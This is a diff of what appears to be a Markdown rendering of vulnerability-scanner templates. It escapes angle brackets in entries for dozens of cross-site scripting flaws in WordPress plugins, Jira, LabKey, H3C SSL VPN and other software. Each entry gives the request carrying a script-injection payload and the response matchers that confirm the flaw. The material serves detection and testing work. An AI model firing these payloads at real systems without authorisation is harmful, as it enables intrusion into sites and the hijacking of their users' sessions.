@@ -11433,7 +11433,7 @@ Content-Type: application/json
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/Login?!'><sVg/OnLoAD=alert`1337`//
+- {{BaseURL}}/Login?!'>\<sVg/OnLoAD=alert`1337`//
 ### Matchers
 
 **Type - status**
@@ -11442,7 +11442,7 @@ Content-Type: application/json
 
 **Type - word**
 - words
-    1. value=''><sVg/OnLoAD=alert`1337`//'>
+    1. value=''>\<sVg/OnLoAD=alert`1337`//'>
 - part - body
 
 ---
@@ -11459,7 +11459,7 @@ Content-Type: application/json
 
 **Type - word**
 - words
-    1. <svg/onload=alert(1)>
+    1. \<svg/onload=alert(1)>
 - part - body
 
 **Type - word**
@@ -11472,7 +11472,7 @@ Content-Type: application/json
     1. 200
 
 ---
-# WordPress Yuzo <5.12.94 - Cross-Site Scripting
+# WordPress Yuzo \<5.12.94 - Cross-Site Scripting
 ## Description
 - WordPress Yuzo Related Posts plugin before 5.12.94 is vulnerable to cross-site scripting
 because it mistakenly expects that is_admin() verifies that the
@@ -11490,7 +11490,7 @@ POST /wp-admin/options-general.php?page=yuzo-related-post HTTP/1.1
 Host: {{Hostname}}
 Content-Type: application/x-www-form-urlencoded
 
-yuzo_related_post_css_and_style=</style><script>alert(0);</script>
+yuzo_related_post_css_and_style=\</style>\<script>alert(0);\</script>
 
 ```
 ### Step - 2
@@ -11503,14 +11503,14 @@ Host: {{Hostname}}
 
 **Type - dsl**
 - dsl
-    1. contains(body_2, "<script>alert(0);</script>")
+    1. contains(body_2, "\<script>alert(0);\</script>")
 
 **Type - dsl**
 - dsl
     1. contains(tolower(all_headers_2), 'text/html')
 
 ---
-# WordPress Hero Maps Premium <=2.2.1 - Cross-Site Scripting
+# WordPress Hero Maps Premium \<=2.2.1 - Cross-Site Scripting
 ## Description
 - WordPress Hero Maps Premium plugin 2.2.1 and prior contains an unauthenticated reflected cross-site scripting vulnerability via the views/dashboard/index.php p parameter.
 - severity - medium
@@ -11523,7 +11523,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. foo"></script><script>alert(document.domain)</script>
+    1. foo">\</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -11536,7 +11536,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# LabKey Server Community Edition <18.3.0 - Cross-Site Scripting
+# LabKey Server Community Edition \<18.3.0 - Cross-Site Scripting
 ## Description
 - LabKey Server Community Edition before 18.3.0-61806.763 contains a reflected cross-site scripting vulnerability via the onerror parameter in the /__r2/query endpoints, which allows an unauthenticated remote attacker to inject arbitrary JavaScript.
 - severity - medium
@@ -11550,7 +11550,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -11579,7 +11579,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. "</script><script>alert(document.domain);</script><script>
+    1. "\</script>\<script>alert(document.domain);\</script>\<script>
 - part - body
 
 **Type - word**
@@ -11635,7 +11635,7 @@ recipient=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -11659,7 +11659,7 @@ recipient=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 **Type - word**
 - part - body
 - words
-    1. Template : <script>alert(document.domain)</script>
+    1. Template : \<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -11686,7 +11686,7 @@ recipient=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
     2. /wp-content/themes/citybook
 - condition - and
 
@@ -11700,7 +11700,7 @@ recipient=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
     1. 200
 
 ---
-# WordPress Woody Ad Snippets <2.2.5 - Cross-Site Scripting/Remote Code Execution
+# WordPress Woody Ad Snippets \<2.2.5 - Cross-Site Scripting/Remote Code Execution
 ## Description
 - WordPress Woody Ad Snippets prior to 2.2.5 is susceptible to cross-site scripting and remote code execution via admin/includes/class.import.snippet.php, which allows unauthenticated options import as demonstrated by storing a cross-site scripting payload for remote code execution.
 
@@ -11771,7 +11771,7 @@ recipient=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 - part - body
 - words
     1. ";alert('1');//
-    2. <title>Welcome</title>
+    2. \<title>Welcome\</title>
 - condition - and
 
 ---
@@ -11790,7 +11790,7 @@ recipient=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 **Type - word**
 - part - body
 - words
-    1. username = "</script><script>alert(document.domain)</script>
+    1. username = "\</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -11802,7 +11802,7 @@ recipient=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
     1. 200
 
 ---
-# Jira < 8.1.1 - Cross-Site Scripting
+# Jira \< 8.1.1 - Cross-Site Scripting
 ## Description
 - Jira before 8.1.1 contains a cross-site scripting vulnerability via ConfigurePortalPages.jspa resource in the searchOwnerUserName parameter.
 
@@ -11817,7 +11817,7 @@ recipient=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 **Type - word**
 - part - body
 - words
-    1. '<script>alert(1)</script>' does not exist
+    1. '\<script>alert(1)\</script>' does not exist
 
 **Type - word**
 - part - header
@@ -11829,7 +11829,7 @@ recipient=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
     1. 200
 
 ---
-# MicroStrategy Library <11.1.3 - Cross-Site Scripting
+# MicroStrategy Library \<11.1.3 - Cross-Site Scripting
 ## Description
 - MicroStrategy Library before 11.1.3 contains a cross-site scripting vulnerability. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
 
@@ -11856,7 +11856,7 @@ recipient=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
     1. 200
 
 ---
-# DomainMOD <=4.13.0 - Cross-Site Scripting
+# DomainMOD \<=4.13.0 - Cross-Site Scripting
 ## Description
 - DomainMOD through 4.13.0 contains a cross-site scripting vulnerability via /reporting/domains/cost-by-month.php in Daterange parameters.
 
@@ -11903,7 +11903,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script>
+    1. \<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -11932,7 +11932,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. <svg/onload=alert(1337)>
+    1. \<svg/onload=alert(1337)>
 - part - body
 
 **Type - word**
@@ -11941,7 +11941,7 @@ Host: {{Hostname}}
 - part - header
 
 ---
-# Carel pCOWeb <B1.2.4 - Cross-Site Scripting
+# Carel pCOWeb \<B1.2.4 - Cross-Site Scripting
 ## Description
 - Carel pCOWeb prior to B1.2.4 is vulnerable to stored cross-site scripting, as demonstrated by the config/pw_snmp.html "System contact" field.
 
@@ -11969,11 +11969,11 @@ Host: {{Hostname}}
 - dsl
     1. contains(body_2, "text/html")
     2. status_code_2 == 200
-    3. contains(body_2, 'value=\"\"><script>alert(document.domain)</script>\"></td>')
+    3. contains(body_2, 'value=\"\">\<script>alert(document.domain)\</script>\">\</td>')
 - condition - and
 
 ---
-# WordPress API Bearer Auth <20190907 - Cross-Site Scripting
+# WordPress API Bearer Auth \<20190907 - Cross-Site Scripting
 ## Description
 - WordPress API Bearer Auth plugin before 20190907 contains a cross-site scripting vulnerability. The server parameter is not correctly filtered in swagger-config.yaml.php.
 - severity - medium
@@ -11986,7 +11986,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -11999,7 +11999,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# Zarafa WebApp <=2.0.1.47791 - Cross-Site Scripting
+# Zarafa WebApp \<=2.0.1.47791 - Cross-Site Scripting
 ## Description
 - Zarafa WebApp 2.0.1.47791 and earlier contains an unauthenticated reflected cross-site scripting vulnerability. An attacker can execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site.
 
@@ -12014,7 +12014,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <svg/onload=alert(/xss/)>
+    1. \<svg/onload=alert(/xss/)>
 
 **Type - word**
 - part - header
@@ -12026,9 +12026,9 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress My Calendar <= 3.1.9 - Cross-Site Scripting
+# WordPress My Calendar \<= 3.1.9 - Cross-Site Scripting
 ## Description
-- WordPress plugin My Calendar <= 3.1.9 is susceptible to reflected cross-site scripting which can be triggered via unescaped usage of URL parameters in multiple locations throughout the site.
+- WordPress plugin My Calendar \<= 3.1.9 is susceptible to reflected cross-site scripting which can be triggered via unescaped usage of URL parameters in multiple locations throughout the site.
 - severity - medium
 - tags - cve,cve2019,wordpress,xss,wp-plugin,wpscan
 ## Requests
@@ -12039,7 +12039,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -12060,13 +12060,13 @@ Host: {{Hostname}}
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/data/autosuggest-remote.php?q="><img%20src=x%20onerror=alert(1)>
-- {{BaseURL}}/admin/data/autosuggest-remote.php?q="><img%20src=x%20onerror=alert(1)>
+- {{BaseURL}}/data/autosuggest-remote.php?q=">\<img%20src=x%20onerror=alert(1)>
+- {{BaseURL}}/admin/data/autosuggest-remote.php?q=">\<img%20src=x%20onerror=alert(1)>
 ### Matchers
 
 **Type - word**
 - words
-    1. ><img src=x onerror=alert(1)>>)1(trela=rorreno
+    1. >\<img src=x onerror=alert(1)>>)1(trela=rorreno
 - part - body
 
 **Type - word**
@@ -12090,7 +12090,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. <script>alert('xss')</script>
+    1. \<script>alert('xss')\</script>
 
 **Type - word**
 - part - header
@@ -12102,7 +12102,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Download Manager <2.9.94 - Cross-Site Scripting
+# WordPress Download Manager \<2.9.94 - Cross-Site Scripting
 ## Description
 - WordPress Download Manager plugin before 2.9.94 contains a cross-site scripting vulnerability via the category shortcode feature, as demonstrated by the orderby or search[publish_date] parameter.
 - severity - medium
@@ -12115,7 +12115,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. <script>alert(1)</script>
+    1. \<script>alert(1)\</script>
 - part - body
 
 **Type - word**
@@ -12136,13 +12136,13 @@ Host: {{Hostname}}
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/free_time_failed.cgi?err_msg=<script>alert(document.domain);</script>
+- {{BaseURL}}/free_time_failed.cgi?err_msg=\<script>alert(document.domain);\</script>
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain);</script>
+    1. \<script>alert(document.domain);\</script>
     2. Please contact with administrator.
 - condition - and
 
@@ -12167,12 +12167,12 @@ Host: {{Hostname}}
 ### URL
 - {{BaseURL}}/kindeditor/php/demo.php
 - {{BaseURL}}/php/demo.php
-  - content1=</script><script>alert(document.domain)</script>&button=%E6%8F%90%E4%BA%A4%E5%86%85%E5%AE%B9
+  - content1=\</script>\<script>alert(document.domain)\</script>&button=%E6%8F%90%E4%BA%A4%E5%86%85%E5%AE%B9
 ### Matchers
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -12202,7 +12202,7 @@ Host: {{Hostname}}
 - part - body
 
 ---
-# Timesheet Next Gen <=1.5.3 - Cross-Site Scripting
+# Timesheet Next Gen \<=1.5.3 - Cross-Site Scripting
 ## Description
 - Timesheet Next Gen 1.5.3 and earlier is vulnerable to cross-site scripting that allows an attacker to execute arbitrary HTML and JavaScript code via a "redirect" parameter. The component is: Web login form: login.php, lines 40 and 54. The attack vector is: reflected XSS, victim may click the malicious url.
 - severity - medium
@@ -12225,11 +12225,11 @@ username=%27%22%3E%3Cscript%3Ejavascript%3Aalert%28document.domain%29%3C%2Fscrip
 
 **Type - word**
 - words
-    1. ><script>javascript:alert(document.domain)</script>
+    1. >\<script>javascript:alert(document.domain)\</script>
 - part - body
 
 ---
-# L-Soft LISTSERV <16.5-2018a - Cross-Site Scripting
+# L-Soft LISTSERV \<16.5-2018a - Cross-Site Scripting
 ## Description
 - L-Soft LISTSERV before 16.5-2018a contains a reflected cross-site scripting vulnerability via the /scripts/wa.exe OK parameter.
 - severity - medium
@@ -12242,7 +12242,7 @@ username=%27%22%3E%3Cscript%3Ejavascript%3Aalert%28document.domain%29%3C%2Fscrip
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -12255,7 +12255,7 @@ username=%27%22%3E%3Cscript%3Ejavascript%3Aalert%28document.domain%29%3C%2Fscrip
     1. 200
 
 ---
-# 2 Click Socialmedia Buttons < 0.34 - Cross-Site Scripting
+# 2 Click Socialmedia Buttons \< 0.34 - Cross-Site Scripting
 ## Description
 - A cross-site scripting vulnerability in libs/xing.php in the 2 Click Social Media Buttons plugin before 0.34 for WordPress allows remote attackers to inject arbitrary web script or HTML via the xing-url parameter.
 - severity - medium
@@ -12268,7 +12268,7 @@ username=%27%22%3E%3Cscript%3Ejavascript%3Aalert%28document.domain%29%3C%2Fscrip
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -12294,7 +12294,7 @@ username=%27%22%3E%3Cscript%3Ejavascript%3Aalert%28document.domain%29%3C%2Fscrip
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -12307,7 +12307,7 @@ username=%27%22%3E%3Cscript%3Ejavascript%3Aalert%28document.domain%29%3C%2Fscrip
     1. 200
 
 ---
-# WordPress Plugin Download Monitor < 3.3.5.9 - Cross-Site Scripting
+# WordPress Plugin Download Monitor \< 3.3.5.9 - Cross-Site Scripting
 ## Description
 - A cross-site scripting vulnerability in the Download Monitor plugin before 3.3.5.9 for WordPress allows remote attackers to inject arbitrary web script or HTML via the dlsearch parameter to the default URI.
 - severity - medium
@@ -12320,7 +12320,7 @@ username=%27%22%3E%3Cscript%3Ejavascript%3Aalert%28document.domain%29%3C%2Fscrip
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -12346,7 +12346,7 @@ username=%27%22%3E%3Cscript%3Ejavascript%3Aalert%28document.domain%29%3C%2Fscrip
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -12372,7 +12372,7 @@ username=%27%22%3E%3Cscript%3Ejavascript%3Aalert%28document.domain%29%3C%2Fscrip
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -12398,7 +12398,7 @@ username=%27%22%3E%3Cscript%3Ejavascript%3Aalert%28document.domain%29%3C%2Fscrip
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -12424,7 +12424,7 @@ username=%27%22%3E%3Cscript%3Ejavascript%3Aalert%28document.domain%29%3C%2Fscrip
 
 **Type - word**
 - words
-    1. </sCripT><sCripT>alert(document.domain)</sCripT>
+    1. \</sCripT>\<sCripT>alert(document.domain)\</sCripT>
 - part - body
 
 **Type - word**
@@ -12450,7 +12450,7 @@ username=%27%22%3E%3Cscript%3Ejavascript%3Aalert%28document.domain%29%3C%2Fscrip
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -12478,7 +12478,7 @@ username=%27%22%3E%3Cscript%3Ejavascript%3Aalert%28document.domain%29%3C%2Fscrip
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script>
+    1. \<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -12505,7 +12505,7 @@ username=%27%22%3E%3Cscript%3Ejavascript%3Aalert%28document.domain%29%3C%2Fscrip
 **Type - word**
 - part - body
 - words
-    1. ,"CardFormatNo":"<img src=x onerror=alert(document.domain)>"}
+    1. ,"CardFormatNo":"\<img src=x onerror=alert(document.domain)>"}
 
 **Type - word**
 - part - header
@@ -12538,7 +12538,7 @@ userfont=&artica-language=&StandardDropDown=&HTMLTITLE=&username=admin&password=
 **Type - word**
 - part - body
 - words
-    1. Password" value="admin"><script>alert(document.domain)</script>
+    1. Password" value="admin">\<script>alert(document.domain)\</script>
     2. Artica Web
 - condition - and
 
@@ -12552,7 +12552,7 @@ userfont=&artica-language=&StandardDropDown=&HTMLTITLE=&username=admin&password=
     1. 200
 
 ---
-# WordPress Copyright Proof <=4.16 - Cross-Site-Scripting
+# WordPress Copyright Proof \<=4.16 - Cross-Site-Scripting
 ## Description
 - WordPress Copyright Proof plugin 4.16 and prior contains a cross-site scripting vulnerability. It does not sanitize and escape a parameter before outputting it back via an AJAX action available to both unauthenticated and authenticated users when a specific setting is enabled.
 
@@ -12570,7 +12570,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. got message <script>alert(document.domain)</script>
+    1. got message \<script>alert(document.domain)\</script>
 - condition - and
 
 **Type - word**
@@ -12583,7 +12583,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# Advanced Booking Calendar < 1.7.1 - Cross-Site Scripting
+# Advanced Booking Calendar \< 1.7.1 - Cross-Site Scripting
 ## Description
 - The Advanced Booking Calendar WordPress plugin before 1.7.1 does not sanitise and escape the room parameter before outputting it back in an admin page, leading to a Reflected Cross-Site Scripting issue
 
@@ -12609,14 +12609,14 @@ Host: {{Hostname}}
 
 **Type - dsl**
 - dsl
-    1. contains(body_2, '<script>alert(document.domain)</script>')
+    1. contains(body_2, '\<script>alert(document.domain)\</script>')
     2. contains(body_2, 'advanced-booking-calendar')
     3. contains(all_headers_2, 'text/html')
     4. status_code_2 == 200
 - condition - and
 
 ---
-# ProfileGrid < 5.1.1 - Cross-Site Scripting
+# ProfileGrid \< 5.1.1 - Cross-Site Scripting
 ## Description
 - The ProfileGrid WordPress plugin before 5.1.1 does not sanitise and escape a parameter before outputting it back in the page, leading to a Reflected Cross-Site Scripting.
 
@@ -12634,7 +12634,7 @@ log={{username}}&pwd={{password}}&wp-submit=Log+In
 ```
 ### Step - 2
 ```
-GET /wp-admin/admin.php?page=pm_add_group&id="><script>alert%28document.domain%29<%2Fscript> HTTP/1.1
+GET /wp-admin/admin.php?page=pm_add_group&id=">\<script>alert%28document.domain%29\<%2Fscript> HTTP/1.1
 Host: {{Hostname}}
 
 ```
@@ -12645,11 +12645,11 @@ Host: {{Hostname}}
     1. contains(all_headers_2, "text/html")
     2. status_code_2 == 200
     3. contains(body_2, "Extension Options")
-    4. contains(body_2, "<script>alert(document.domain)</script>&tab")
+    4. contains(body_2, "\<script>alert(document.domain)\</script>&tab")
 - condition - and
 
 ---
-# WordPress Feed Them Social <3.0.1 - Cross-Site Scripting
+# WordPress Feed Them Social \<3.0.1 - Cross-Site Scripting
 ## Description
 - WordPress Feed Them Social plugin before 3.0.1 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape a parameter before outputting it back in the page.
 
@@ -12664,7 +12664,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <img src onerror=alert(document.domain)><br/>
+    1. \<img src onerror=alert(document.domain)>\<br/>
 
 **Type - word**
 - part - header
@@ -12676,7 +12676,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Easy Pricing Tables <3.2.1 - Cross-Site Scripting
+# WordPress Easy Pricing Tables \<3.2.1 - Cross-Site Scripting
 ## Description
 - WordPress Easy Pricing Tables plugin before 3.2.1 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape a parameter before reflecting it back in a page available to any user both authenticated and unauthenticated when a specific setting is enabled.
 
@@ -12685,13 +12685,13 @@ Host: {{Hostname}}
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/wp-admin/admin-ajax.php?action=ptp_design4_color_columns&post_id=1&column_names=<script>alert(document.domain)</script>
+- {{BaseURL}}/wp-admin/admin-ajax.php?action=ptp_design4_color_columns&post_id=1&column_names=\<script>alert(document.domain)\</script>
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script> - Color
+    1. \<script>alert(document.domain)\</script> - Color
 
 **Type - word**
 - part - header
@@ -12703,7 +12703,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# H3C SSL VPN <=2022-07-10 - Cross-Site Scripting
+# H3C SSL VPN \<=2022-07-10 - Cross-Site Scripting
 ## Description
 - H3C SSL VPN 2022-07-10 and prior contains a cookie-based cross-site scripting vulnerability in wnm/login/login.json svpnlang.
 
@@ -12714,7 +12714,7 @@ Host: {{Hostname}}
 ```
 GET /wnm/login/login.json HTTP/1.1
 Host: {{Hostname}}
-Cookie: svpnlang=<script>alert('document.domain')</script>
+Cookie: svpnlang=\<script>alert('document.domain')\</script>
 
 ```
 ### Matchers
@@ -12722,7 +12722,7 @@ Cookie: svpnlang=<script>alert('document.domain')</script>
 **Type - word**
 - part - body
 - words
-    1. <script>alert('document.domain')</script>
+    1. \<script>alert('document.domain')\</script>
 
 **Type - word**
 - part - header
@@ -12749,7 +12749,7 @@ Cookie: svpnlang=<script>alert('document.domain')</script>
 
 **Type - word**
 - words
-    1. <TITLE>"><script>alert(document.domain)</script>
+    1. \<TITLE>">\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -12761,7 +12761,7 @@ Cookie: svpnlang=<script>alert('document.domain')</script>
     1. 200
 
 ---
-# Country Selector < 1.6.6 - Cross-Site Scripting
+# Country Selector \< 1.6.6 - Cross-Site Scripting
 ## Description
 - The plugin does not sanitise and escape the country and lang parameters before outputting them back in the response, leading to a Reflected Cross-Site Scripting.
 
@@ -12791,7 +12791,7 @@ country=%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E&lang=%3Cimg%2
 **Type - word**
 - part - body
 - words
-    1. <img src=x onerror=alert(document.domain)>
+    1. \<img src=x onerror=alert(document.domain)>
     2. country_selector_
 - condition - and
 
@@ -12813,13 +12813,13 @@ country=%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E&lang=%3Cimg%2
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/admin.back<img%20src=x%20onerror=alert(document.domain)>
+- {{BaseURL}}/admin.back\<img%20src=x%20onerror=alert(document.domain)>
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. back<img src=x onerror=alert(document.domain)>
+    1. back\<img src=x onerror=alert(document.domain)>
 
 **Type - word**
 - part - header
@@ -12845,7 +12845,7 @@ country=%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E&lang=%3Cimg%2
 
 **Type - word**
 - words
-    1. Search Result for \"><img src=x onerror=alert(document.domain)>
+    1. Search Result for \">\<img src=x onerror=alert(document.domain)>
 
 **Type - word**
 - part - header
@@ -12866,13 +12866,13 @@ country=%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E&lang=%3Cimg%2
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/error.php?SERVER_NAME=<script>alert(document.domain)</script>
+- {{BaseURL}}/error.php?SERVER_NAME=\<script>alert(document.domain)\</script>
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script>
+    1. \<script>alert(document.domain)\</script>
     2. The requested resource is not authorized to view
 - condition - and
 
@@ -12901,7 +12901,7 @@ country=%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E&lang=%3Cimg%2
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script>' target='cart_info
+    1. \<script>alert(document.domain)\</script>' target='cart_info
 
 **Type - word**
 - part - header
@@ -12913,7 +12913,7 @@ country=%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E&lang=%3Cimg%2
     1. 200
 
 ---
-# WordPress E2Pdf <1.16.45 - Cross-Site Scripting
+# WordPress E2Pdf \<1.16.45 - Cross-Site Scripting
 ## Description
 - WordPress E2Pdf plugin before 1.16.45 contains a cross-site scripting vulnerability. The plugin does not sanitize and escape some of its settings, even when the unfiltered_html capability is disallowed. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site, making it possible to steal cookie-based authentication credentials and launch other attacks.
 
@@ -12954,7 +12954,7 @@ Host: {{Hostname}}
 
 **Type - dsl**
 - dsl
-    1. contains(body_4, 'placeholder=\"Developer IPs\" ></textarea><svg/onload=alert(document.domain)>')
+    1. contains(body_4, 'placeholder=\"Developer IPs\" >\</textarea>\<svg/onload=alert(document.domain)>')
     2. contains(all_headers_4, "text/html")
     3. status_code_4 == 200
 - condition - and
@@ -12983,7 +12983,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. Error: 1<script>alert(document.domain)</script>
+    1. Error: 1\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -12995,7 +12995,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress All-in-One WP Migration <=7.62 - Cross-Site Scripting
+# WordPress All-in-One WP Migration \<=7.62 - Cross-Site Scripting
 ## Description
 - WordPress All-in-One WP Migration plugin 7.62 and prior contains a cross-site scripting vulnerability. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
 
@@ -13029,7 +13029,7 @@ Host: {{Hostname}}
 - dsl
     1. contains(all_headers_3, "text/html")
     2. status_code_3 == 200
-    3. contains(body_3, '{\"new_value\":[\"XSSPAYLOAD<svg onload=alert(document.domain)>')
+    3. contains(body_3, '{\"new_value\":[\"XSSPAYLOAD\<svg onload=alert(document.domain)>')
 - condition - and
 ### Extractors
 
@@ -13041,7 +13041,7 @@ Host: {{Hostname}}
 - internal - True
 
 ---
-# WooCommerce Stored Exporter WordPress Plugin < 2.7.1 - Cross-Site Scripting
+# WooCommerce Stored Exporter WordPress Plugin \< 2.7.1 - Cross-Site Scripting
 ## Description
 - The plugin was affected by a reflected cross-site scripting vulnerability in the woo_ce admin page.
 - severity - medium
@@ -13069,7 +13069,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -13081,7 +13081,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress All-in-one Floating Contact Form <2.0.4 - Cross-Site Scripting
+# WordPress All-in-one Floating Contact Form \<2.0.4 - Cross-Site Scripting
 ## Description
 - WordPress All-in-one Floating Contact Form, Call, Chat, and 50+ Social Icon Tabs plugin before 2.0.4 contains a reflected cross-site scripting vulnerability on the my-sticky-elements-leads admin page.
 - severity - medium
@@ -13109,7 +13109,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <img src onerror=alert(`document.domain`) x">
+    1. \<img src onerror=alert(`document.domain`) x">
 
 **Type - word**
 - part - header
@@ -13134,14 +13134,14 @@ POST /cgi-bin/login.cgi HTTP/1.1
 Host: {{Hostname}}
 Content-Type: application/x-www-form-urlencoded
 
-newUI=1&page=login&username=admin&langChange=0&ipaddr=x.x.x.x&login_page=login.shtml&homepage=main.shtml&sysinitpage=sysinit.shtml&hostname=")</script><script>alert(document.domain);</script>&key=M27234733&password=63a36bceec2d3bba30d8611c323f4cda&lang_=cn
+newUI=1&page=login&username=admin&langChange=0&ipaddr=x.x.x.x&login_page=login.shtml&homepage=main.shtml&sysinitpage=sysinit.shtml&hostname=")\</script>\<script>alert(document.domain);\</script>&key=M27234733&password=63a36bceec2d3bba30d8611c323f4cda&lang_=cn
 
 ```
 ### Matchers
 
 **Type - word**
 - words
-    1. <script>alert(document.domain);</script>
+    1. \<script>alert(document.domain);\</script>
     2. parent.location.replace("http://")
 - condition - and
 
@@ -13155,7 +13155,7 @@ newUI=1&page=login&username=admin&langChange=0&ipaddr=x.x.x.x&login_page=login.s
     1. 200
 
 ---
-# Trilium <0.52.4 - Cross-Site Scripting
+# Trilium \<0.52.4 - Cross-Site Scripting
 ## Description
 - Trilium prior to 0.52.4, 0.53.1-beta contains a cross-site scripting vulnerability which can allow an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site.
 - severity - medium
@@ -13171,8 +13171,8 @@ newUI=1&page=login&username=admin&langChange=0&ipaddr=x.x.x.x&login_page=login.s
 **Type - word**
 - part - body
 - words
-    1. No handler matched for custom <img src=x onerror=alert(document.domain)>
-    2. Note '<img src=x onerror=alert(document.domain)>' not found
